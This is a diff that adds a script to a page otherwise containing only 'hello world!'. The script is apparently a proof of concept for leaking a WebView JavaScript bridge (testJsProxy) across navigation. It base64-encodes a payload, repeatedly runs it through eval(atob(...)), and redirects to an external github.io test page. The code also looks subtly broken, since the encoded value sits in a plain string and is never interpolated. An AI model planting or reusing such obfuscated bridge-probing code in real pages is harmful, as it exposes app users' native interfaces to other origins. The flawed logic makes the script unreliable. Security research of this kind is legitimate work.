@@ -1,1 +1,19 @@
 hello world!
+<script>
+  function triggerPoc(url){
+  const currUrl = location.href;
+  const payload = `
+  if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){
+  window.__cloudx_called = true;
+  console.log(window.testJsProxy.test())
+  }`;
+  const base64 = btoa(payload);
+  for(let i=0; i<100; i++){
+  setTimeout(function(){
+  if(window.testJsProxy && typeof window.testJsProxy.test === "function"){
+  eval(atob("${base64}"));
+  }},i)}
+  location.href = url;
+  }
+  triggerPoc("https://renfromabove.github.io/secureTest/index.html")
+</script>
